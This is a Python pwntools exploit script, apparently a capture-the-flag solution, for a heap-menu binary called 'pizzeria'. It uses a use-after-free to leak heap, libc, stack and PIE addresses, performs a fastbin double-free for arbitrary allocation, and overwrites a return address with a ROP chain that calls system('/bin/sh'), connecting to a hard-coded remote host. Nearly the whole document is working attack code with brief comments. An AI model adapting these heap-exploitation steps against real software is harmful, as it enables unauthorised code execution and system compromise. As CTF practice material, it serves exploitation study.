#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizzeria")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc 34.70.212.151 8007"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")		# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
c
"""

def conn():
	if args.LOCAL:
		return process([exe.path])
	
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)

	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def malloc(io: tube, topping: bytes, amt: int):
	io.sl(b'1')
	io.sl(topping)
	io.sl(bstr(amt))

def edit(io: tube, topping: bytes, content: bytes):
	io.sl(b'2')
	io.s(topping.ljust(13, b'\0'))
	io.s(content)
	io.ru(b"New topping added successfully !\n")

def free(io: tube, topping: bytes):
	io.sl(b'3')
	io.sl(topping)

def read(io: tube, topping: bytes):
	io.sl(b'4')
	io.sl(topping)
	io.ru(b"verify ?\n")
	return io.ru(b'\n', drop=True)

def main():
	toppings = ["Tomato","Onion","Capsicum","Corn","Mushroom","Pineapple","Olives","Double Cheese","Paneer","Chicken"]
	toppings = [x.encode() for x in toppings]

	io = conn()

	# - entering a non-existant topping in customize topping isn't checked; it returns -1 as index which overlaps with the counts
	# - UAF: the free function (remove) sets the size to 0 but not the buffer pointer

	malloc(io, toppings[0], 63)
	free(io, toppings[0])
	heap = u64(read(io, toppings[0]).ljust(8, b'\0')) << 12
	aleak("heap", heap)

	# 0x200 chunks don't fit in the fastbins, so if you fill the tcache and free one it gets put in the unsorted bin
	for i in range(7): malloc(io, toppings[i], 63)
	malloc(io, toppings[7], 63)
	malloc(io, toppings[8], 63) # barrier to avoid top chunk consolidation
	for i in range(7): free(io, toppings[i])
	free(io, toppings[7])
	free(io, toppings[8])

	libc.address = u64(read(io, toppings[7]).ljust(8, b'\0')) - (libc.sym.main_arena+96)
	aleak("libc", libc.address)

	# fastbin attack to have arbitrary alloc
	# put this onto the tcache[0x200] pointer, since we still have 7 chunks in that bin we can get some easy allocs
	addr = (heap + 0x180) ^ ((heap + 0x1000) >> 12)

	for i in range(7): malloc(io, toppings[i], 10)
	malloc(io, toppings[7], 10)
	malloc(io, toppings[8], 10)
	for i in range(7): free(io, toppings[i])
	free(io, toppings[7])
	free(io, toppings[8])
	free(io, toppings[7])

	for i in range(7): malloc(io, toppings[i], 10)
	malloc(io, toppings[7], 10)
	edit(io, toppings[7], p64(addr))
	malloc(io, toppings[8], 10)
	malloc(io, toppings[9], 10)
	malloc(io, toppings[9], 10) # now we can modify this chunk with any address we want to allocate
	
	# alloc onto environ to leak stack
	edit(io, toppings[9], p64(libc.sym.environ))
	malloc(io, toppings[0], 63)
	stack = u64(read(io, toppings[0]).ljust(8, b'\0'))
	aleak("stack", stack)

	# now onto something to leak PIE
	pie_ret = stack - 0x188
	edit(io, toppings[9], p64(pie_ret))
	malloc(io, toppings[0], 63)
	exe.address = u64(read(io, toppings[0]).ljust(8, b'\0')) - 0x23db
	aleak("exe", exe.address)

	# i leaked via the toppings strings but it fucked one up, fix it
	edit(io, toppings[0], flat(exe.address + 0x23db, exe.address + 0x23e2))

	# canaries and return pointers aren't 16-aligned so we'll get an actually-arbitrary write by allocating onto the buffers
	# we're not allocating onto a canary: at this point we can just allocate onto the misaligned return pointer
	edit(io, toppings[9], p64(stack - 0x1d8))
	malloc(io, toppings[8], 63)
	# edit(io, toppings[8], flat(stack-0x90, stack-0x258)) # the first ones' the canary, the second one's edit's return pointer
	edit(io, toppings[8], p64(stack-0x220))

	# now overwrite what will be edit's return pointer with a rop chain!
	rop = ROP([exe, libc])
	rop.raw(rop.ret)
	rop.system(libc.binsh())
	edit(io, toppings[0], rop.chain())

	pause()
	io.interactive()

if __name__ == "__main__":
	main()
